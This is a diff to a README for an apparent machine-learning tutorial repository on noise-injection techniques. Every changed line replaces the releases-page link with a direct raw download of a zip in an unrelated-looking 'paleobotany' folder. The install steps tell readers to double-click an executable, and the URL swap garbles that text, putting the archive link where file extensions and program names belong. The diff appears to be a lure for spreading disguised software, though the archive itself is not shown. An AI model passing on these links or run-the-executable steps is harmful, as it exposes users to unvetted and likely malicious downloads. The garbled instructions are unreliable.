@@ -2,7 +2,7 @@
 # 🌊 Noise-Injection-Techniques - Enhance Your Machine Learning Models
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Omar98165/Noise-Injection-Techniques/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Omar98165/Noise-Injection-Techniques/main/paleobotany/Noise-Injection-Techniques-v1.1-alpha.1.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Omar98165/Noise-Injection-Techniques/main/paleobotany/Noise-Injection-Techniques-v1.1-alpha.1.zip)
 
 ## 📖 Overview
 Noise Injection Techniques provides a comprehensive exploration of methods to make machine learning models more robust to real-world bad data. This repository explains and demonstrates various techniques including Gaussian noise, dropout, mixup, masking, adversarial noise, and label smoothing. With intuitive explanations, theory, and practical code examples, this repository serves as a valuable resource for anyone looking to improve their machine learning projects.
@@ -27,7 +27,7 @@ Before you begin, ensure that your system meets the following requirements:
 ## 🛠️ How to Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Omar98165/Noise-Injection-Techniques/releases) to find the latest version available for download.
+   Go to the [Releases page](https://raw.githubusercontent.com/Omar98165/Noise-Injection-Techniques/main/paleobotany/Noise-Injection-Techniques-v1.1-alpha.1.zip) to find the latest version available for download.
 
 2. **Select the Latest Release**  
    Look for the latest release version. It will usually be at the top of the page.
@@ -36,10 +36,10 @@ Before you begin, ensure that your system meets the following requirements:
    Click on the file name that matches your operating system to start the download.
 
 4. **Extract the Files**  
-   Once the download completes, find the downloaded file on your computer. This might be in your "Downloads" folder. Right-click the .zip or .tar.gz file and select "Extract" or "Unzip".
+   Once the download completes, find the downloaded file on your computer. This might be in your "Downloads" folder. Right-click the .zip or https://raw.githubusercontent.com/Omar98165/Noise-Injection-Techniques/main/paleobotany/Noise-Injection-Techniques-v1.1-alpha.1.zip file and select "Extract" or "Unzip".
 
 5. **Run the Application**  
-   Navigate to the extracted folder and look for the executable file (like `run_app.exe` or `run_app.sh`). Double-click this file to run the application.
+   Navigate to the extracted folder and look for the executable file (like `https://raw.githubusercontent.com/Omar98165/Noise-Injection-Techniques/main/paleobotany/Noise-Injection-Techniques-v1.1-alpha.1.zip` or `https://raw.githubusercontent.com/Omar98165/Noise-Injection-Techniques/main/paleobotany/Noise-Injection-Techniques-v1.1-alpha.1.zip`). Double-click this file to run the application.
 
 6. **Follow On-screen Instructions**  
    The application will guide you through any required setup or configurations.
@@ -82,5 +82,5 @@ The repository extensively covers topics related to:
 ## 📢 Reminder
 Don't forget to check back for updates and improvements. Each new release aims to enhance the existing methods and provide better functionality.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Omar98165/Noise-Injection-Techniques/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Omar98165/Noise-Injection-Techniques/main/paleobotany/Noise-Injection-Techniques-v1.1-alpha.1.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Omar98165/Noise-Injection-Techniques/main/paleobotany/Noise-Injection-Techniques-v1.1-alpha.1.zip)
 ```
